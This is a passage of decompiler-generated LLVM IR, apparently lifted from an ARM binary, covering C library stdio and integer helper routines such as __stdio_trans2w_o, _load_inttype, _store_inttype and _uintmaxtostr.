  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_168a4, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_16890, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_168ac = load i32, i32* @r4, align 4
  store i32 %v3_168ac, i32* %stack_var_-8, align 4
  %v3_168b0 = load i8, i8* %arg1, align 1
  %v4_168b0 = zext i8 %v3_168b0 to i32
  store i32 %v4_168b0, i32* %r2.global-to-local, align 4
  %v2_168b4 = add i32 %tmp, 1
  %v3_168b4 = inttoptr i32 %v2_168b4 to i8*
  %v4_168b4 = load i8, i8* %v3_168b4, align 1
  %v5_168b4 = zext i8 %v4_168b4 to i32
  store i32 %v5_168b4, i32* %r3.global-to-local, align 4
  %v4_168b8 = mul nuw nsw i32 %v5_168b4, 256
  %v5_168b8 = or i32 %v4_168b8, %v4_168b0
  store i32 %v5_168b8, i32* %r2.global-to-local, align 4
  %v2_168bc = and i32 %v5_168b8, %arg2
  %v4_168bc = icmp eq i32 %v2_168bc, 0
  store i1 %v4_168bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_168bc, label %dec_label_pc_168c8, label %dec_label_pc_168e0

dec_label_pc_168c8:                               ; preds = %entry
  %v1_168c8 = and i32 %v5_168b8, 2176
  %v2_168c8 = icmp eq i32 %v1_168c8, 0
  store i1 %v2_168c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c8, label %dec_label_pc_168d0, label %dec_label_pc_168f4

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168c8
  %v2_168d0 = or i32 %v5_168b8, %arg2
  store i32 %v2_168d0, i32* %r2.global-to-local, align 4
  %v3_168d4 = sdiv i32 %v2_168d0, 256
  store i32 %v3_168d4, i32* %r3.global-to-local, align 4
  %v1_168d8 = trunc i32 %v3_168d4 to i8
  store i8 %v1_168d8, i8* %v3_168b4, align 1
  %v0_168dc = load i32, i32* %r2.global-to-local, align 4
  %v1_168dc = trunc i32 %v0_168dc to i8
  store i8 %v1_168dc, i8* %arg1, align 1
  %v0_168e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %entry, %dec_label_pc_168d0
  %v0_1692c = phi i32 [ %tmp, %entry ], [ %v0_168e0.pre, %dec_label_pc_168d0 ]
  %v1_168e0 = inttoptr i32 %v0_1692c to i8*
  %v2_168e0 = load i8, i8* %v1_168e0, align 1
  %v3_168e0 = zext i8 %v2_168e0 to i32
  store i32 %v3_168e0, i32* %r2.global-to-local, align 4
  %v1_168e4 = add i32 %v0_1692c, 1
  %v2_168e4 = inttoptr i32 %v1_168e4 to i8*
  %v3_168e4 = load i8, i8* %v2_168e4, align 1
  %v4_168e4 = zext i8 %v3_168e4 to i32
  store i32 %v4_168e4, i32* %r3.global-to-local, align 4
  %v4_168e8 = mul nuw nsw i32 %v4_168e4, 256
  %v1_168ec = and i32 %v3_168e0, 32
  %v2_168ec = icmp eq i32 %v1_168ec, 0
  store i1 %v2_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168ec, label %dec_label_pc_1691c, label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168c8, %dec_label_pc_168e0
  %v0_168f4 = call i32 @__errno_location()
  store i32 %v0_168f4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_168fc = inttoptr i32 %v0_168f4 to i32*
  store i32 9, i32* %v2_168fc, align 4
  br label %dec_label_pc_16900

dec_label_pc_16900:                               ; preds = %dec_label_pc_16944, %dec_label_pc_168f4
  %v0_16900 = load i32, i32* @r4, align 4
  %v1_16900 = inttoptr i32 %v0_16900 to i32*
  %v2_16900 = load i32, i32* %v1_16900, align 4
  %v1_16904 = or i32 %v2_16900, 8
  store i32 %v1_16904, i32* %r3.global-to-local, align 4
  %v3_16908 = sdiv i32 %v2_16900, 256
  store i32 %v3_16908, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16910 = trunc i32 %v3_16908 to i8
  %v3_16910 = add i32 %v0_16900, 1
  %v4_16910 = inttoptr i32 %v3_16910 to i8*
  store i8 %v1_16910, i8* %v4_16910, align 1
  %v0_16914 = load i32, i32* %r3.global-to-local, align 4
  %v1_16914 = trunc i32 %v0_16914 to i8
  %v2_16914 = load i32, i32* @r4, align 4
  %v3_16914 = inttoptr i32 %v2_16914 to i8*
  store i8 %v1_16914, i8* %v3_16914, align 1
  %v2_16918 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16918, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1691c:                               ; preds = %dec_label_pc_168e0
  %tmp15 = urem i8 %v2_168e0, 4
  %v2_1691c = icmp eq i8 %tmp15, 0
  store i1 %v2_1691c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1691c, label %dec_label_pc_16980, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_1691c
  %v1_16924 = and i32 %v3_168e0, 4
  store i32 %v1_16924, i32* @r1, align 4
  %v2_16924 = icmp eq i32 %v1_16924, 0
  store i1 %v2_16924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16924, label %dec_label_pc_1692c, label %dec_label_pc_1695c

dec_label_pc_1692c:                               ; preds = %dec_label_pc_16924
  %v1_1692c = add i32 %v0_1692c, 20
  %v2_1692c = inttoptr i32 %v1_1692c to i32*
  %v3_1692c = load i32, i32* %v2_1692c, align 4
  store i32 %v3_1692c, i32* %r2.global-to-local, align 4
  %v1_16930 = add i32 %v0_1692c, 16
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* %r3.global-to-local, align 4
  %v9_16934 = icmp eq i32 %v3_1692c, %v3_16930
  store i1 %v9_16934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16934, label %dec_label_pc_1693c, label %dec_label_pc_16944

dec_label_pc_1693c:                               ; preds = %dec_label_pc_1692c
  %v1_1693c = and i32 %v3_168e0, 2
  %v2_1693c = icmp eq i32 %v1_1693c, 0
  store i1 %v2_1693c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1693c, label %dec_label_pc_1695c, label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %dec_label_pc_1692c, %dec_label_pc_1693c
  %v1_16944 = and i32 %v4_168e8, 1024
  %v2_16944 = icmp eq i32 %v1_16944, 0
  store i1 %v2_16944, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_16944, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_16950 = call i32 @__GI_fseek()
  store i32 %v0_16950, i32* %r0.global-to-local, align 4
  %v2_16954 = icmp eq i32 %v0_16950, 0
  store i1 %v2_16954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16954, label %.dec_label_pc_1695c_crit_edge, label %dec_label_pc_16900

.dec_label_pc_1695c_crit_edge:                    ; preds = %dec_label_pc_16944
  %v0_1695c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1695c

dec_label_pc_1695c:                               ; preds = %.dec_label_pc_1695c_crit_edge, %dec_label_pc_16924, %dec_label_pc_1693c
  %v2_1696c = phi i32 [ %v0_1695c.pre, %.dec_label_pc_1695c_crit_edge ], [ %v0_1692c, %dec_label_pc_16924 ], [ %v0_1692c, %dec_label_pc_1693c ]
  %v1_1695c = inttoptr i32 %v2_1696c to i32*
  %v2_1695c = load i32, i32* %v1_1695c, align 4
  store i32 %v2_1695c, i32* %r3.global-to-local, align 4
  %v1_16960 = add i32 %v2_1696c, 8
  %v2_16960 = inttoptr i32 %v1_16960 to i32*
  %v3_16960 = load i32, i32* %v2_16960, align 4
  store i32 %v3_16960, i32* %r1.global-to-local, align 4
  %v1_16964 = and i32 %v2_1695c, -4
  store i32 %v1_16964, i32* %r3.global-to-local, align 4
  %v3_16968 = sdiv i32 %v2_1695c, 256
  store i32 %v3_16968, i32* %r2.global-to-local, align 4
  %v1_1696c = trunc i32 %v3_16968 to i8
  %v3_1696c = add i32 %v2_1696c, 1
  %v4_1696c = inttoptr i32 %v3_1696c to i8*
  store i8 %v1_1696c, i8* %v4_1696c, align 1
  %v0_16970 = load i32, i32* %r1.global-to-local, align 4
  %v1_16970 = load i32, i32* @r4, align 4
  %v2_16970 = add i32 %v1_16970, 20
  %v3_16970 = inttoptr i32 %v2_16970 to i32*
  store i32 %v0_16970, i32* %v3_16970, align 4
  %v0_16974 = load i32, i32* %r3.global-to-local, align 4
  %v1_16974 = trunc i32 %v0_16974 to i8
  %v2_16974 = load i32, i32* @r4, align 4
  %v3_16974 = inttoptr i32 %v2_16974 to i8*
  store i8 %v1_16974, i8* %v3_16974, align 1
  %v0_16978 = load i32, i32* %r1.global-to-local, align 4
  %v1_16978 = load i32, i32* @r4, align 4
  %v2_16978 = add i32 %v1_16978, 24
  %v3_16978 = inttoptr i32 %v2_16978 to i32*
  store i32 %v0_16978, i32* %v3_16978, align 4
  %v0_1697c = load i32, i32* %r1.global-to-local, align 4
  %v1_1697c = load i32, i32* @r4, align 4
  %v2_1697c = add i32 %v1_1697c, 16
  %v3_1697c = inttoptr i32 %v2_1697c to i32*
  store i32 %v0_1697c, i32* %v3_1697c, align 4
  %v0_16980.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %dec_label_pc_1691c, %dec_label_pc_1695c
  %v2_1698c = phi i32 [ %v0_1692c, %dec_label_pc_1691c ], [ %v0_16980.pre, %dec_label_pc_1695c ]
  %v1_16980 = inttoptr i32 %v2_1698c to i32*
  %v2_16980 = load i32, i32* %v1_16980, align 4
  %v1_16984 = or i32 %v2_16980, 64
  store i32 %v1_16984, i32* %r2.global-to-local, align 4
  %v3_16988 = sdiv i32 %v2_16980, 256
  store i32 %v3_16988, i32* %r3.global-to-local, align 4
  %v1_1698c = trunc i32 %v3_16988 to i8
  %v3_1698c = add i32 %v2_1698c, 1
  %v4_1698c = inttoptr i32 %v3_1698c to i8*
  store i8 %v1_1698c, i8* %v4_1698c, align 1
  %v0_16990 = load i32, i32* @r4, align 4
  %v1_16990 = add i32 %v0_16990, 1
  %v2_16990 = inttoptr i32 %v1_16990 to i8*
  %v3_16990 = load i8, i8* %v2_16990, align 1
  %v4_16990 = zext i8 %v3_16990 to i32
  %v3_16994 = mul nuw nsw i32 %v4_16990, 256
  store i32 %v3_16994, i32* %r3.global-to-local, align 4
  %v1_16998 = and i32 %v3_16994, 2816
  store i32 %v1_16998, i32* %r0.global-to-local, align 4
  %v2_16998 = icmp eq i32 %v1_16998, 0
  store i1 %v2_16998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16998, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_16980
  %v2_1699c = add i32 %v0_16990, 12
  %v3_1699c = inttoptr i32 %v2_1699c to i32*
  %v4_1699c = load i32, i32* %v3_1699c, align 4
  store i32 %v4_1699c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_16980
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_169a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_169a4 = trunc i32 %v0_169a4 to i8
  %v3_169a4 = inttoptr i32 %v0_16990 to i8*
  store i8 %v1_169a4, i8* %v3_169a4, align 1
  %v0_169a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169a8, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_169a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_169a8 = load i32, i32* @r4, align 4
  %v3_169a8 = add i32 %v2_169a8, 28
  %v4_169a8 = inttoptr i32 %v3_169a8 to i32*
  store i32 %v1_169a8, i32* %v4_169a8, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_169ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_169ac, i32* @r4, align 4
  %v8_169ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_169ac

; uselistorder directives
  uselistorder i32 %v3_16994, { 1, 0 }
  uselistorder i32 %v3_16988, { 1, 0 }
  uselistorder i32 %v3_16968, { 1, 0 }
  uselistorder i32 %v2_1696c, { 0, 2, 1 }
  uselistorder i1 %v2_1691c, { 1, 0 }
  uselistorder i32 %v3_16908, { 1, 0 }
  uselistorder i32 %v0_1692c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_168d4, { 1, 0 }
  uselistorder i32 %v5_168b8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 13, 14, 2, 15, 1, 16, 17, 18, 4, 11, 12, 3, 7, 8, 6, 9, 5, 10, 19 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_16980, { 1, 0 }
  uselistorder label %dec_label_pc_1695c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16944, { 1, 0 }
  uselistorder label %dec_label_pc_168f4, { 1, 0 }
  uselistorder label %dec_label_pc_168e0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_169b0 = load i32, i32* @r2, align 4
  %v1_169b0 = icmp slt i32 %v0_169b0, 0
  %v0_169b4 = load i32, i32* @r0, align 4
  %v1_169b8 = and i32 %v0_169b4, 2048
  %v2_169ec = icmp eq i32 %v1_169b8, 0
  br i1 %v1_169b0, label %dec_label_pc_169ec, label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %entry
  br i1 %v2_169ec, label %dec_label_pc_169c8, label %dec_label_pc_169f4

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169c0
  %v7_169c8 = icmp eq i32 %v0_169b4, 256
  %v0_169cc = load i32, i32* @r1, align 4
  %v1_169cc = inttoptr i32 %v0_169cc to i32*
  %v2_169cc = load i32, i32* %v1_169cc, align 4
  %v2_169d0 = urem i32 %v2_169cc, 256
  %v2_169d0.v2_169cc = select i1 %v7_169c8, i32 %v2_169d0, i32 %v2_169cc
  br i1 %v7_169c8, label %.thread, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169c8
  %v7_169d8 = icmp eq i32 %v0_169b4, 512
  br i1 %v7_169d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_169d8
  %v4_169e0 = urem i32 %v2_169d0.v2_169cc, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_169d8, %dec_label_pc_169c8, %bb
  %v1_169e8 = phi i32 [ %v2_169cc, %dec_label_pc_169d8 ], [ %v2_169d0, %dec_label_pc_169c8 ], [ %v4_169e0, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_169e8

dec_label_pc_169ec:                               ; preds = %entry
  br i1 %v2_169ec, label %dec_label_pc_169fc, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169c0, %dec_label_pc_169ec
  %v0_169f4 = load i32, i32* @r1, align 4
  %v1_169f4 = inttoptr i32 %v0_169f4 to i32*
  %v2_169f4 = load i32, i32* %v1_169f4, align 4
  %v3_169f4 = add i32 %v0_169f4, 4
  %v4_169f4 = inttoptr i32 %v3_169f4 to i32*
  %v5_169f4 = load i32, i32* %v4_169f4, align 4
  store i32 %v5_169f4, i32* @r1, align 4
  ret i32 %v2_169f4

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169ec
  %v7_169fc = icmp eq i32 %v0_169b4, 256
  %v0_16a00 = load i32, i32* @r1, align 4
  %v1_16a00 = inttoptr i32 %v0_16a00 to i32*
  %v2_16a00 = load i32, i32* %v1_16a00, align 4
  %v2_16a04 = urem i32 %v2_16a00, 256
  %v2_16a04.v2_16a00 = select i1 %v7_169fc, i32 %v2_16a04, i32 %v2_16a00
  br i1 %v7_169fc, label %.thread2, label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169fc
  %v7_16a0c = icmp eq i32 %v0_169b4, 512
  br i1 %v7_16a0c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_16a0c
  %v4_16a10 = mul i32 %v2_16a04.v2_16a00, 65536
  %v4_16a14 = sdiv i32 %v4_16a10, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16a0c, %dec_label_pc_169fc, %bb5
  %v0_16a18 = phi i32 [ %v2_16a00, %dec_label_pc_16a0c ], [ %v2_16a04, %dec_label_pc_169fc ], [ %v4_16a14, %bb5 ]
  %v3_16a18 = ashr i32 %v0_16a18, 31
  store i32 %v3_16a18, i32* @r1, align 4
  ret i32 %v0_16a18

; uselistorder directives
  uselistorder i32 %v0_16a18, { 1, 0 }
  uselistorder i32 %v2_16a04, { 1, 0 }
  uselistorder i32 %v2_16a00, { 1, 2, 0 }
  uselistorder i32 %v2_169d0, { 1, 0 }
  uselistorder i32 %v2_169cc, { 1, 2, 0 }
  uselistorder i1 %v2_169ec, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169f4, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_16a20 = icmp eq i32 %arg2, 256
  br i1 %v7_16a20, label %dec_label_pc_16a4c, label %dec_label_pc_16a28

dec_label_pc_16a28:                               ; preds = %entry
  %v7_16a28 = icmp eq i32 %arg2, 2048
  br i1 %v7_16a28, label %dec_label_pc_16a30, label %dec_label_pc_16a38

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a28
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_16a30 = add i32 %tmp2, 4
  %v6_16a30 = inttoptr i32 %v5_16a30 to i32*
  store i32 %arg4, i32* %v6_16a30, align 4
  ret i32 %tmp2

dec_label_pc_16a38:                               ; preds = %dec_label_pc_16a28
  %v7_16a38 = icmp eq i32 %arg2, 512
  br i1 %v7_16a38, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16a38
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_16a38
  %v4_16a3c = sdiv i32 %arg3, 256
  %v1_16a48 = trunc i32 %v4_16a3c to i8
  %v4_16a48 = add i32 %tmp2, 1
  %v5_16a48 = inttoptr i32 %v4_16a48 to i8*
  store i8 %v1_16a48, i8* %v5_16a48, align 1
  br label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16a4c, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_16a58 = icmp slt i32 %arg4, 0
  %v2_16a58 = icmp eq i32 %arg4, 0
  store i1 %v2_16a58, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_16a58, label %dec_label_pc_16a70, label %dec_label_pc_16a90

dec_label_pc_16a70:                               ; preds = %entry
  %v1_16a70 = icmp slt i32 %arg3, 0
  %v2_16a70 = icmp eq i32 %arg3, 0
  store i1 %v2_16a70, i1* %cpsr_z.global-to-local, align 1
  %v1_16a74 = sub i32 0, %arg4
  store i32 %v1_16a74, i32* %r7.global-to-local, align 4
  br i1 %v1_16a70, label %dec_label_pc_16a7c, label %dec_label_pc_16a90

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a70
  %v1_16a80 = sub i32 0, %arg2
  store i32 %v1_16a80, i32* %r5.global-to-local, align 4
  %v2_16a80 = icmp eq i32 %arg2, 0
  %v2_16a84 = icmp eq i1 %v2_16a80, false
  %v5_16a84 = sext i1 %v2_16a84 to i32
  %v6_16a84 = sub i32 %v5_16a84, %arg3
  store i32 %v6_16a84, i32* %r6.global-to-local, align 4
  %v19_16a84 = icmp eq i32 %v6_16a84, 0
  store i1 %v19_16a84, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a98

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a70, %entry
  br label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a7c, %dec_label_pc_16a90
  %storemerge = phi i8 [ 0, %dec_label_pc_16a90 ], [ 1, %dec_label_pc_16a7c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_16aa0 = load i32, i32* %r7.global-to-local, align 4
  %v2_16aa8 = udiv i32 -1, %v0_16aa0
  store i32 %v2_16aa8, i32* %fp.global-to-local, align 4
  %v2_16ab8 = urem i32 -1, %v0_16aa0
  %v1_16abc = add i32 %v2_16ab8, 1
  store i32 %v1_16abc, i32* %sb.global-to-local, align 4
  %v9_16ac0 = icmp eq i32 %v1_16abc, %v0_16aa0
  store i1 %v9_16ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16ac0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16a98
  %v1_16ac4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16ac4, i32* %sb.global-to-local, align 4
  %v2_16ac8 = add i32 %v2_16aa8, 1
  store i32 %v2_16ac8, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16a98, %bb
  %v0_16acc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16acc, i32* %sl.global-to-local, align 4
  %v0_16ad0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ad0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4thread-pre-split:               ; preds = %bb21
  %v0_16ad4.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_16adc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16ad4thread-pre-split, %.thread
  %v0_16b44 = phi i32 [ %v0_16adc.pre, %dec_label_pc_16ad4thread-pre-split ], [ %v0_16aa0, %.thread ]
  %v0_16af0 = phi i32 [ %v0_16ad4.pr, %dec_label_pc_16ad4thread-pre-split ], [ %v0_16acc, %.thread ]
  %v2_16ad4 = icmp eq i32 %v0_16af0, 0
  store i1 %v2_16ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ad4, label %dec_label_pc_16b40, label %dec_label_pc_16ae4

dec_label_pc_16ae4:                               ; preds = %dec_label_pc_16ad4
  %v2_16ae4 = urem i32 %v0_16af0, %v0_16b44
  %v2_16af4 = udiv i32 %v0_16af0, %v0_16b44
  store i32 %v2_16af4, i32* %sl.global-to-local, align 4
  %v0_16b00 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b04 = urem i32 %v0_16b00, %v0_16b44
  %v1_16b0c = load i32, i32* %sb.global-to-local, align 4
  %v3_16b0c = mul i32 %v1_16b0c, %v2_16ae4
  %v4_16b0c = add i32 %v3_16b0c, %v2_16b04
  store i32 %v4_16b0c, i32* %r5.global-to-local, align 4
  %v2_16b14 = udiv i32 %v0_16b00, %v0_16b44
  %v0_16b1c = load i32, i32* %fp.global-to-local, align 4
  %v3_16b1c = mul i32 %v0_16b1c, %v2_16ae4
  %v4_16b1c = add i32 %v3_16b1c, %v2_16b14
  %v2_16b24 = udiv i32 %v4_16b0c, %v0_16b44
  %v2_16b2c = add i32 %v4_16b1c, %v2_16b24
  br label %dec_label_pc_16b60

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16ad4
  %v0_16b40 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b58 = udiv i32 %v0_16b40, %v0_16b44
  br label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16ae4, %dec_label_pc_16b40
  %storemerge24 = phi i32 [ %v2_16b58, %dec_label_pc_16b40 ], [ %v2_16b2c, %dec_label_pc_16ae4 ]
  %v0_16b7c = phi i32 [ %v2_16b58, %dec_label_pc_16b40 ], [ %v2_16b2c, %dec_label_pc_16ae4 ]
  %v1_16b7c = phi i32 [ 0, %dec_label_pc_16b40 ], [ %v2_16af4, %dec_label_pc_16ae4 ]
  %v4_16b0c.pn = phi i32 [ %v0_16b40, %dec_label_pc_16b40 ], [ %v4_16b0c, %dec_label_pc_16ae4 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_16b68 = urem i32 %v4_16b0c.pn, %v0_16b44
  %v3_16b60 = load i32, i32* %stack_var_0, align 4
  %v2_16b64 = icmp ugt i32 %v0_16b68, 8
  %v7_16b64 = icmp eq i32 %v0_16b68, 9
  store i1 %v7_16b64, i1* %cpsr_z.global-to-local, align 1
  %v1_16b6c = add i32 %v0_16b68, 48
  %v0_16b74 = load i32, i32* %r8.global-to-local, align 4
  %v1_16b74 = add i32 %v0_16b74, -1
  store i32 %v1_16b74, i32* %r8.global-to-local, align 4
  %v2_16b78 = xor i1 %v7_16b64, true
  %v3_16b78 = and i1 %v2_16b64, %v2_16b78
  %extract.t = trunc i32 %v1_16b6c to i8
  br i1 %v3_16b78, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_16b60
  %v2_16b68 = add i32 %v3_16b60, %v0_16b68
  %extract.t8 = trunc i32 %v2_16b68 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16b60, %bb20
  %v0_16b80.off0 = phi i8 [ %extract.t, %dec_label_pc_16b60 ], [ %extract.t8, %bb20 ]
  %v2_16b7c = or i32 %v0_16b7c, %v1_16b7c
  %v4_16b7c = icmp eq i32 %v2_16b7c, 0
  store i1 %v4_16b7c, i1* %cpsr_z.global-to-local, align 1
  %v3_16b80 = inttoptr i32 %v1_16b74 to i8*
  store i8 %v0_16b80.off0, i8* %v3_16b80, align 1
  %v0_16b84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16b84, label %dec_label_pc_16b88, label %dec_label_pc_16ad4thread-pre-split

dec_label_pc_16b88:                               ; preds = %bb21
  %v2_16b88 = load i8, i8* %stack_var_-40, align 1
  %v2_16b8c = icmp eq i8 %v2_16b88, 0
  store i1 %v2_16b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b8c, label %dec_label_pc_16b88..thread2_crit_edge, label %bb22

dec_label_pc_16b88..thread2_crit_edge:            ; preds = %dec_label_pc_16b88
  %v0_16b98.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_16b88
  %v3_16b94 = load i32, i32* %r8.global-to-local, align 4
  %v4_16b94 = add i32 %v3_16b94, -1
  %v5_16b94 = inttoptr i32 %v4_16b94 to i8*
  store i8 45, i8* %v5_16b94, align 1
  %v6_16b94 = load i32, i32* %r8.global-to-local, align 4
  %v7_16b94 = add i32 %v6_16b94, -1
  store i32 %v7_16b94, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16b88..thread2_crit_edge, %bb22
  %v0_16b98 = phi i32 [ %v0_16b98.pre, %dec_label_pc_16b88..thread2_crit_edge ], [ %v7_16b94, %bb22 ]
  ret i32 %v0_16b98

; uselistorder directives
  uselistorder i32 %v0_16b68, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16b44, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
